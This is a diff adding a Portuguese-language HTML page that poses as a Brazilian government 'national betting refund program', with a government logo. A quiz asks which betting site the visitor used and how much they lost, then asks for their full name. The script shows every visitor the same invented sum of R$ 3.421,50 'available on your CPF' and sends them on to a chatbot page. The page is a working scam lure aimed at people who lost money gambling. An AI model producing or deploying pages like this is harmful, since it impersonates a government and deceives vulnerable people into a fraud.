@@ -1,0 +1,151 @@
+<!DOCTYPE html>
+<html lang="pt-BR">
+<head>
+  <meta charset="UTF-8">
+  <title>Programa Nacional de Reembolso de Apostas</title>
+  <meta name="viewport" content="width=device-width, initial-scale=1.0">
+  <link rel="stylesheet" href="style.css">
+  <style>
+    .container.verificacao {
+      background-color: #fff;
+      padding: 30px 20px;
+      max-width: 400px;
+      width: 90%;
+      box-shadow: 0 0 15px rgba(0,0,0,0.2);
+      border-radius: 8px;
+      text-align: center;
+      margin: 30px auto;
+    }
+
+    .verificacao h2 {
+      color: #333;
+      margin-bottom: 10px;
+    }
+
+    .verificacao p {
+      color: #666;
+      margin-bottom: 20px;
+    }
+
+    input[type="text"] {
+      padding: 12px;
+      width: 90%;
+      max-width: 100%;
+      margin-bottom: 15px;
+      border: 1px solid #ccc;
+      border-radius: 6px;
+      font-size: 16px;
+    }
+
+    .btn {
+      padding: 12px 25px;
+      background-color: #2e7d32;
+      color: white;
+      border: none;
+      border-radius: 6px;
+      font-size: 16px;
+      cursor: pointer;
+      transition: background-color 0.3s;
+    }
+
+    .btn:hover {
+      background-color: #1b5e20;
+    }
+
+    #mensagem {
+      color: #2e7d32;
+      font-size: 18px;
+      font-weight: bold;
+    }
+
+    #btn-solicitar {
+      margin-top: 20px;
+      background-color: #0066cc;
+    }
+
+    @media screen and (max-width: 480px) {
+      .container.verificacao {
+        padding: 25px 15px;
+      }
+
+      input[type="text"] {
+        font-size: 14px;
+      }
+
+      .btn {
+        font-size: 14px;
+        padding: 10px 20px;
+      }
+    }
+  </style>
+</head>
+<body>
+  <div class="container">
+    <img src="images/logogov.jpeg" alt="Logo Governo" class="logo">
+    <h1>Programa Nacional de Reembolso de Apostas</h1>
+    <p class="sub">Verifique se você tem valores disponíveis para resgate.</p>
+
+    <div id="quiz">
+      <div class="question active" id="q1">
+        <h2>1. Em qual plataforma você apostou?</h2>
+        <button onclick="next('q1','q2')">Blaze</button>
+        <button onclick="next('q1','q2')">Betano</button>
+        <button onclick="next('q1','q2')">Bet365</button>
+        <button onclick="next('q1','q2')">Outras</button>
+      </div>
+
+      <div class="question hidden" id="q2">
+        <h2>2. Qual o valor aproximado que você perdeu?</h2>
+        <button onclick="next('q2','q3')">Até R$500</button>
+        <button onclick="next('q2','q3')">Entre R$500 e R$2000</button>
+        <button onclick="next('q2','q3')">Mais de R$2000</button>
+      </div>
+
+      <div class="question hidden" id="q3">
+        <h2>3. CPF cadastrado na plataforma?</h2>
+        <button onclick="showResult()">Sim</button>
+        <button onclick="showResult()">Não sei</button>
+      </div>
+
+      <div class="question hidden" id="verificacao">
+        <div class="container verificacao">
+          <h2>Verificação de Elegibilidade</h2>
+          <p>Digite seu nome completo para verificar se você possui valores disponíveis para saque.</p>
+          <input type="text" id="nome" placeholder="Ex: Rafael Oliveira"><br>
+          <button id="verificar" class="btn">VERIFICAR</button>
+
+          <div id="resultadoBox" class="hidden">
+            <h3 id="mensagem" style="display: none;"></h3>
+            <button id="btn-solicitar" class="btn" style="display: none;" onclick="window.location.href='/teste01/chatbot/index.html'">QUERO SOLICITAR REEMBOLSO</button>            
+          </div>
+        </div>
+      </div>
+    </div>
+  </div>
+
+  <script src="script.js"></script>
+  <script>
+    function next(current, next) {
+      document.getElementById(current).classList.add('hidden');
+      document.getElementById(next).classList.remove('hidden');
+    }
+
+    function showResult() {
+      next('q3', 'verificacao');
+    }
+
+    document.getElementById('verificar').addEventListener('click', function () {
+      const nome = document.getElementById('nome').value.trim();
+      if (nome.length < 5) {
+        alert('Por favor, digite seu nome completo.');
+        return;
+      }
+      const mensagem = `${nome}, encontramos exatamente o valor de R$ 3.421,50 disponível para reembolso no seu CPF.`;
+      document.getElementById('mensagem').textContent = mensagem;
+      document.getElementById('resultadoBox').classList.remove('hidden');
+      document.getElementById('verificar').remove();
+      document.getElementById('btn-solicitar').classList.remove('hidden');
+    });
+  </script>
+</body>
+</html>
